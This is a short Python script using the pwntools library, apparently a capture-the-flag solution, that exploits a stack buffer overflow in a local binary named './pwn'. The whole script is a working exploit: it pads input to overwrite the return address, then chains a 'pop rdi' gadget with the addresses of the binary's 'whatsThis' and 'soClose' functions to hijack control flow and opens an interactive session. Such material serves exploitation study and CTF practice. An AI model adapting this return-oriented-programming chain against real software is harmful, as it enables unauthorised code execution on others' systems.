#!/bin/python3

from pwn import *

p = process('./pwn')
e = ELF('./pwn')
r = ROP('./pwn')

offset = 0x7ffc5fc4d748 - 0x7ffc5fc4d720

payload = b'A'*offset
payload += p64(r.find_gadget(["pop rdi"]).address)
payload += p64(e.sym['whatsThis'])
payload += p64(e.sym['soClose'] + 19)

p.sendline(payload)

p.interactive()